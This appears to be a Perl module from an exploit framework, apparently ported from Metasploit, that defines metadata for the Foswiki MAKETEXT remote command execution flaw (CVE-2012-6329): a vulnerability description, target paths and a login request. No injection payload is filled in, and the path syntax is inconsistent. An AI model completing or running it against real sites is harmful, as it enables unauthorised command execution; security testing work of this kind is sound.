package FOSWIKI::MSF::FoswikiMaketext;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "FoswikiMaketext";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2012-6329",
  DESCRIPTION => "

          This module exploits a vulnerability in the MAKETEXT Foswiki variable. By using

        a specially crafted MAKETEXT, a malicious user can execute shell commands since the

        input is passed to the Perl \"eval\" command without first being sanitized. The

        problem is caused by an underlying security issue in the CPAN:Locale::Maketext

        module.  Only Foswiki sites that have user interface localization enabled

        (UserInterfaceInternationalisation variable set) are vulnerable.



          If USERNAME and PASSWORD aren't provided, anonymous access will be tried.

        Also, if the FoswikiPage option isn't provided, the module will try to create a

        random page on the SandBox space. The modules has been tested successfully on

        Foswiki 1.1.5 as distributed with the official Foswiki-1.1.5-vmware image.

      ",
  METHOD => "GET",
  MSF_MODULE => "foswiki_maketext",
  OSVDB => 88410,
  PATH => "",
  PATHS => [
    "__\\\@BASE__bin/login",
    "__\\\@BASE__bin/edit__\\\@PAGE__",
    "#{\@base}bin/save#{\@page}",
    "__\\\@BASE____\\\@PAGE__",
  ],
  PAYLOAD => "?",
  REFERENCES => ["http://foswiki.org/Support/SecurityAlert-CVE-2012-6330"],
  TITLE => "Foswiki MAKETEXT Remote Command Execution",
  VARIABLES => {
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'VALIDATION_KEY' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'SESSION' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'bin/login',
      PAYLOAD      => 'username=__USERNAME__&password=__PASSWORD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /bin/login',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
